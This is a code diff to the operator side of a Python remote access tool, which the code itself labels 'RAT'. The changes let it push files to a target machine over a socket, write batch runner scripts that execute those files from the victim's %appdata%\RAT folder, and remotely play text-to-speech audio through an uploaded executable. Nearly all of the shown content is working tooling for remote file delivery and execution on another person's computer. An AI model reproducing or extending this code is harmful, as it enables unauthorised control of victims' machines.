@@ -1,3 +1,4 @@
+from gtts import gTTS
 import socket
 import tqdm
 import os
@@ -6,8 +7,10 @@ import tempfile
 
 SEPARATOR = "<SEPARATOR>"
 BUFFER_SIZE = 4096  # send 4096 bytes each time step
+APPDATAFOLDER = "RAT"
 port = None
 host = None
+audioplayer_sent = False
 
 
 def set_port(new_port):
@@ -43,6 +46,7 @@ def connect(host, port):
 
 
 def send_file(s, filename):
+    filename = filename.strip('"')
     filesize = os.path.getsize(filename)
     s.send(f"{filename}{SEPARATOR}{filesize}".encode())
 
@@ -67,6 +71,17 @@ def send_file(s, filename):
             # update the progress bar
             progress.update(len(bytes_read))
     s.close()
+
+
+def send_file2(path):
+    s = connect(host, port)
+    if not s:
+        print(f"[-] Error while connecting to {host}:{port}")
+        return False
+    send_file(s, path)
+    s.close()
+
+    return True
 
 
 def send_data(s, data: bytes, name: str):
@@ -96,35 +111,63 @@ def send_data(s, data: bytes, name: str):
     s.close()
 
 
+def send_audioplayer(path: str):
+    if not path.strip('"').endswith("audioplayer.exe"):
+        print('[!] Audioplayer must be exe named "audioplayer.exe"')
+        return False
+    return send_file2(path)
+
+
 def send_tts(tts_text):
+    global audioplayer_sent
+    if not audioplayer_sent:
+        print(f"[-] {audioplayer_sent=}")
+        inp = input(
+            "Input path to the audioplayer to send or '--force' (without quotes) to set audioplayer_sent=True: "
+        )
+        if inp == "--force".strip():
+            audioplayer_sent = True
+        else:
+            audioplayer_sent = send_audioplayer(inp)
+
+        if not audioplayer_sent:
+            print(f"[-] {audioplayer_sent=}")
+            return False
+
     s = connect(host, port)
     if not s:
-        return
-    tts = f"""from gtts import gTTS
-from playsound import playsound
-text = "{tts_text}"
-output = gTTS(text=text, lang="en", tld="co.in")
-output.save("tts.mp3")
-
-playsound("tts.mp3")
-"""
-    send_data(s, tts.encode(), "tts.py")
+        return False
+    output = gTTS(text=tts_text, lang="en", tld="co.in")
+    output.save("tts.mp3")
+    send_file(s, "tts.mp3")
     s.close()
+    return True
 
 
-def send_runner_code(filename):
-    print(host, port)
+def run_tts(tts_name="tts.mp3"):
+    appdata_path = f"%appdata%\\{APPDATAFOLDER}\\"
+    return send_runner_code(
+        cmd=f"{appdata_path}audioplayer.exe {appdata_path}{tts_name}"
+    )
+
+
+def send_runner_code(*, filename=None, cmd=None):
     s = connect(host, port)
     if not s:
         return
-    runner = f"""import os
-os.startfile(os.path.join(os.path.join(os.getenv('APPDATA'), "RAT"), r"{filename}"))
-"""
-    send_data(s, runner.encode(), "runner.py")
+    if cmd is None:
+        if filename is None:
+            raise TypeError(
+                "The filename and the cmd argument were None, at least one argument must be specified"
+            )
+        cmd = f'"%appdata%\\{APPDATAFOLDER}\\{filename}"'
+
+    send_data(s, ("@echo off\n" + cmd).encode(), "runner.bat")
     s.close()
 
 
 def main():
+    global audioplayer_sent
     print("[+] Welcome")
 
     def input_ip():
@@ -143,22 +186,34 @@ def main():
         print(f"Target: {host}:{port}")
         print("1. send tts")
         print("2. send file")
-        print("3. send file to run")
-        print("4. change ip")
+        print("3. run file")
+        print("4. send file and run")
+        print("5. audioplayer")
+        print("6. change ip")
         print("0. exit")
         action = input("[?] Choose an action: ")
 
         if action == "1":
-            send_tts(input("Input your tts message: "))
+            if send_tts(input("Input your tts message: ").strip('"')):
+                run_tts()
         elif action == "2":
-            s = connect(host, port)
-            if not s:
-                print(f"[-] Error while connecting to {host}:{port}")
-            send_file(s, input("Input path to the file you want to send: "))
-            s.close()
+            send_file2(input("Input path to the file you want to send: "))
         elif action == "3":
-            send_runner_code(input("Input path to the file you want to send and run: "))
+            path = input("Input the name of the file you want to run: ").strip('"')
+            send_runner_code(filename=os.path.basename(path))
         elif action == "4":
+            path = input("Input path to the file you want to send and run: ").strip('"')
+            send_file2(path)
+            send_runner_code(filename=os.path.basename(path))
+        elif action == "5":
+            inp = input(
+                "Input path to the audioplayer to send or '--force' (without quotes) to set audioplayer_sent=True: "
+            ).strip('"')
+            if inp == "--force".strip():
+                audioplayer_sent = True
+                continue
+            audioplayer_sent = send_audioplayer(inp)
+        elif action == "6":
             input_ip()
         elif action == "0":
             print("[<3] Bye!")
